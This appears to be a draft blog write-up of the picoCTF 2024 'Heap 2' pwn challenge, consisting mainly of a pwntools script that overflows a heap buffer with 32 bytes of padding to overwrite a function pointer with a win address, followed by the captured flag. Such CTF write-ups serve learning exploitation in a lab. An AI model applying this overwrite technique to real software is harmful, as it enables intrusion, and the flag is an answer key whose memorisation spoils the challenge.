---
title: "Heap 2 (picoCTF 2024)"
summary: "Easy pwn chal - Heap Overflow Exploit"
description: "Easy pwn chal - Heap Overflow Exploit"
tags: [pwn, easy, writeup]
date: 2024-04-06T22:00:00-05:00
draft: true
searchHidden: false
ShowToc: true
TocOpen: false
hidemeta: false
# weight: 1
---

## Description

Can you handle function pointers?

Given files: [heap-2](/picoctf-heap-2/heap2) [heap2.c](/picoctf-heap-2/heap2.c)

---

## Writeup



### Solve script

```py
from pwn import *

# host = 'host'
# port = <port>
# p = remote(host, port)

elf = ELF('./heap2')
p = elf.process()

# Payload construction
win_addr = p64(0x4011a0)
padding = b'A' * 32
payload = padding + win_addr

p.recvuntil("Enter your choice: ")
p.sendline(b'2')
p.recvuntil("Data for buffer: ")
p.sendline(payload)

p.interactive()
# 4 for flag
```

## Flag

`picoCTF{and_down_the_road_we_go_ba77314d}`

---